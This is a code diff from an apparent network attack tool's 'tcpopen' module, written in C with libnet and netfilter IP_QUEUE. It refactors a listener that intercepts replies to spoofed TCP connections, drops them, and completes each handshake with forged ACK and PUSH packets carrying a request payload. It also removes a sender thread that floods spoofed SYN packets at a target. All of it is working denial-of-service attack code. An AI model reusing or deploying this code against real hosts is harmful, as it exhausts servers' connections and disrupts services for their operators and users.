@@ -59,118 +59,66 @@ static pthreadex_flag_t    attack_flag;
  * LISTENER THREAD
  *****************************************************************************/
 
-static void listener_thread(TCPOPEN_WORK *tw)
+static void tcpopen__listen(TCPOPEN_WORK *tw, TEA_MSG *msg)
 {
   int status;
-
-  /* initialize pcap library */
-  DBG("[LL_%02u] Initializing IPQ message...", tw->w->id);
-  if(ipqex_msg_init(&(tw->msg), &attack_tcpopen__ipq))
-    FAT("[LL_%02u] Cannot initialize IPQ message.", tw->w->id);
 
   /* listen the radio */
   while(!cfg.finalize)
   {
-    if((status = ipqex_msg_read(&(tw->msg), 0)) <= 0)
+    /* but ... in some circumstances ... */
+    if(ipqex_get_ip_header(&(tw->msg))->protocol == 6
+    && ipqex_get_ip_header(&(tw->msg))->daddr == tw->cfg.shost.addr.in.addr
+    && ipqex_get_tcp_header(&(tw->msg))->source == tw->cfg.dhost.port)
     {
-      if(status < 0)
-        ERR("[LL_%02u] Error reading from IPQ: %s",
-            tw->w->id, ipq_errstr());
-    } else {
-      /* but ... in some circumstances ... */
-      if(ipqex_get_ip_header(&(tw->msg))->protocol == 6
-      && ipqex_get_ip_header(&(tw->msg))->daddr == tw->cfg.shost.addr.in.addr
-      && ipqex_get_tcp_header(&(tw->msg))->source == tw->cfg.dhost.port)
+      DBG("[LL_%02u] Received a spoofed connection packet.", tw->w->id);
+      /*
+      DBG2("[LL_%02u] Dropped << %d - %d.%d.%d.%d:%d/%d (rst=%d) => [%08x/%08x] >>",
+              tw->w->id,
+              ipqex_identify_ip_protocol(&(tw->msg)),
+              (ipqex_get_ip_header(&(tw->msg))->saddr >>  0) & 0x00ff,
+              (ipqex_get_ip_header(&(tw->msg))->saddr >>  8) & 0x00ff,
+              (ipqex_get_ip_header(&(tw->msg))->saddr >> 16) & 0x00ff,
+              (ipqex_get_ip_header(&(tw->msg))->saddr >> 24) & 0x00ff,
+              ipqex_get_tcp_header(&(tw->msg))->dest, cfg->dhost.port,
+              ipqex_get_tcp_header(&(tw->msg))->rst,
+              ipqex_get_ip_header(&(tw->msg))->saddr,
+              cfg->shost.s_addr);
+      */
+
+      /* ignore any packet that have anything to do with this connection */
+      if(ipqex_set_verdict(&tw->msg, NF_DROP) <= 0)
+        ERR("[LL_%02u] Cannot DROP IPQ packet.", tw->w->id);
+
+      /* in some special case (handshake) send kakitas */
+      if(ipqex_get_tcp_header(&(tw->msg))->syn != 0
+      && ipqex_get_tcp_header(&(tw->msg))->ack != 0)
       {
-        DBG("[LL_%02u] Received a spoofed connection packet.", tw->w->id);
-        /*
-        DBG2("[LL_%02u] Dropped << %d - %d.%d.%d.%d:%d/%d (rst=%d) => [%08x/%08x] >>",
-                tw->w->id,
-                ipqex_identify_ip_protocol(&(tw->msg)),
-                (ipqex_get_ip_header(&(tw->msg))->saddr >>  0) & 0x00ff,
-                (ipqex_get_ip_header(&(tw->msg))->saddr >>  8) & 0x00ff,
-                (ipqex_get_ip_header(&(tw->msg))->saddr >> 16) & 0x00ff,
-                (ipqex_get_ip_header(&(tw->msg))->saddr >> 24) & 0x00ff,
-                ipqex_get_tcp_header(&(tw->msg))->dest, cfg->dhost.port,
-                ipqex_get_tcp_header(&(tw->msg))->rst,
-                ipqex_get_ip_header(&(tw->msg))->saddr,
-                cfg->shost.s_addr);
-        */
-
-        /* ignore any packet that have anything to do with this connection */
-        if(ipqex_set_verdict(&tw->msg, NF_DROP) <= 0)
-          ERR("[LL_%02u] Cannot DROP IPQ packet.", tw->w->id);
-
-        /* in some special case (handshake) send kakitas */
-        if(ipqex_get_tcp_header(&(tw->msg))->syn != 0
-        && ipqex_get_tcp_header(&(tw->msg))->ack != 0)
-        {
-          /* send handshake and data TCP packet */
-          DBG("[LL_%02u]   - Request packet sending...", tw->w->id);
-          ln_send_packet(&(tw->lnc),
-                         &tw->cfg.shost.addr.in.inaddr, ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
-                         &tw->cfg.dhost.addr.in.inaddr, tw->cfg.dhost.port,
-                         TH_ACK,
-                         ntohs(ipqex_get_tcp_header(&(tw->msg))->window),
-                         ntohl(ipqex_get_tcp_header(&(tw->msg))->ack_seq),
-                         ntohl(ipqex_get_tcp_header(&(tw->msg))->seq) + 1,
-                         NULL, 0);
-          ln_send_packet(&(tw->lnc),
-                         &tw->cfg.shost.addr.in.inaddr, ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
-                         &tw->cfg.dhost.addr.in.inaddr, tw->cfg.dhost.port,
-                         TH_ACK | TH_PUSH,
-                         ntohs(ipqex_get_tcp_header(&(tw->msg))->window),
-                         ntohl(ipqex_get_tcp_header(&(tw->msg))->ack_seq),
-                         ntohl(ipqex_get_tcp_header(&(tw->msg))->seq) + 1,
-                         (char *) tw->cfg.req, tw->cfg.req_size);
-        }
-      } else
-        /* policy: accept anything unknown */
-        if(ipqex_set_verdict(&tw->msg, NF_ACCEPT) <= 0)
-          ERR("[LL_%02u] Cannot ACCEPT IPQ packet.", tw->w->id);
+        /* send handshake and data TCP packet */
+        DBG("[LL_%02u]   - Request packet sending...", tw->w->id);
+        ln_send_packet(&(tw->lnc),
+                       &tw->cfg.shost.addr.in.inaddr, ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
+                       &tw->cfg.dhost.addr.in.inaddr, tw->cfg.dhost.port,
+                       TH_ACK,
+                       ntohs(ipqex_get_tcp_header(&(tw->msg))->window),
+                       ntohl(ipqex_get_tcp_header(&(tw->msg))->ack_seq),
+                       ntohl(ipqex_get_tcp_header(&(tw->msg))->seq) + 1,
+                       NULL, 0);
+        ln_send_packet(&(tw->lnc),
+                       &tw->cfg.shost.addr.in.inaddr, ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
+                       &tw->cfg.dhost.addr.in.inaddr, tw->cfg.dhost.port,
+                       TH_ACK | TH_PUSH,
+                       ntohs(ipqex_get_tcp_header(&(tw->msg))->window),
+                       ntohl(ipqex_get_tcp_header(&(tw->msg))->ack_seq),
+                       ntohl(ipqex_get_tcp_header(&(tw->msg))->seq) + 1,
+                       (char *) tw->cfg.req, tw->cfg.req_size);
+      }
     }
   }
 }
 
 /*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
- * SENDER THREADS
- *   This thread processes all packets coming from NETFILTER/IP_QUEUE and
- *   add more packages to the queue when we have to answer to some SYN+ACK
- *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/
-
-static void sender_thread(TCPOPEN_WORK *tw)
-{
-  unsigned int seq = libnet_get_prand(LIBNET_PRu32);
-  int npackets, i;
-
-  DBG("[SS_%02u] Started sender thread", tw->w->id);
-
-  /* set how many packets will be sent by this thread */
-  npackets = tw->cfg.npackets;
-
-  /* ATTACK */
-  while(!cfg.finalize)
-  {
-    /* wait for work */
-    pthreadex_flag_wait(&attack_flag);
-
-    /* build TCP packet with payload (if requested) */
-    DBG("[SS_%02u] Sending %d packets...", tw->w->id, npackets);
-    for(i = 0; i < npackets; i++)
-    {
-      seq += libnet_get_prand(LIBNET_PRu16) & 0x00ff;
-      ln_send_packet(&tw->lnc,
-                     &tw->cfg.shost.addr.in.inaddr, libnet_get_prand(LIBNET_PRu16),
-                     &tw->cfg.dhost.addr.in.inaddr, tw->cfg.dhost.port,
-                     TH_SYN, 13337,
-                     seq, 0,
-                     NULL, 0);
-    }
-  }
-}
-
-/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
- * GENERIC HHTP THREAD
+ * GENERIC HTTP THREAD
  *   This thread specializes in different tasks depending on thread number
  *     0 - listener
  *     x - sender
